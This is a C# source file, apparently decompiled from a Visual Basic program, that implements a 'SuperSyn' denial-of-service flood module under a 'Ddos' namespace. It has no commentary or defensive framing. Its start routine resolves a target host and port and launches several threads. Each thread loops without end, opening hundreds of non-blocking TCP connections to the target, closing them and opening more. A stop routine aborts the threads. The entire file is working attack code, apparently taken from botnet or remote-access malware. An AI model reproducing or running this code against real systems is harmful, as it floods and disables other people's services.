using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication1.Ddos;

public class Syn
{
	private class SendSyn
	{
		private Socket[] _sock;

		private IPEndPoint ipEo;

		private int SuperSynSockets;

		public SendSyn(IPEndPoint ipEo, int superSynSockets)
		{
			this.ipEo = ipEo;
			SuperSynSockets = superSynSockets;
		}

		private static void OnConnect(IAsyncResult ar)
		{
		}

		public void Send()
		{
			checked
			{
				while (true)
				{
					try
					{
						_sock = new Socket[SuperSynSockets - 1 + 1];
						int num = SuperSynSockets - 1;
						for (int i = 0; i <= num; i++)
						{
							_sock[i] = new Socket(ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
							_sock[i].Blocking = false;
							AsyncCallback callback = OnConnect;
							_sock[i].BeginConnect(ipEo, callback, _sock[i]);
						}
						Thread.Sleep(100);
						int num2 = SuperSynSockets - 1;
						for (int i = 0; i <= num2; i++)
						{
							if (_sock[i].Connected)
							{
								_sock[i].Disconnect(reuseSocket: false);
							}
							_sock[i].Close();
							_sock[i] = null;
						}
						_sock = null;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						int num3 = SuperSynSockets - 1;
						for (int i = 0; i <= num3; i++)
						{
							try
							{
								if (_sock != null)
								{
									if (_sock[i].Connected)
									{
										_sock[i].Disconnect(reuseSocket: false);
									}
									_sock[i].Close();
									_sock[i] = null;
								}
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	private static ThreadStart[] _floodingJob;

	private static Thread[] _floodingThread;

	private static IPEndPoint _ipEo;

	private static SendSyn[] _synClass;

	public static string Host;

	public static bool IsEnabled;

	public static int Port = 80;

	public static int SuperSynSockets = 200;

	public static int Threads = 5;

	[DebuggerNonUserCode]
	public Syn()
	{
	}

	public static void StartSuperSyn()
	{
		try
		{
			_ipEo = new IPEndPoint(Dns.GetHostEntry(Host).AddressList[0], Port);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			_ipEo = new IPEndPoint(IPAddress.Parse(Host), Port);
			ProjectData.ClearProjectError();
		}
		checked
		{
			_floodingThread = new Thread[Threads - 1 + 1];
			_floodingJob = new ThreadStart[Threads - 1 + 1];
			_synClass = new SendSyn[Threads - 1 + 1];
			int num = Threads - 1;
			for (int i = 0; i <= num; i++)
			{
				_synClass[i] = new SendSyn(_ipEo, SuperSynSockets);
				_floodingJob[i] = _synClass[i].Send;
				_floodingThread[i] = new Thread(_floodingJob[i]);
				_floodingThread[i].Start();
			}
			IsEnabled = true;
		}
	}

	public static void StopSuperSyn()
	{
		checked
		{
			int num = Threads - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					_floodingThread[i].Abort();
					_floodingThread[i] = null;
					_floodingJob[i] = null;
					_synClass[i] = null;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			IsEnabled = false;
		}
	}
}
